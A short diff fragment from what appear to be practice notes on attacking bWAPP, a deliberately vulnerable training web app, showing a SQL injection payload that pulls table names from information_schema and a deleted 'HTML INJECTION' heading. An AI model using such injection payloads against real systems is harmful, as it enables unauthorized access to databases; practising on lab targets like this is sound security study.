@@ -19,7 +19,4 @@ then
 enummeration', (select table_name from information_schema.tables where table_schema='bWAPP' limit 1,1))-- 
   result: owner in new post is table name, continue
   
-******************
-* HTML INJECTION *
-******************
-<
+
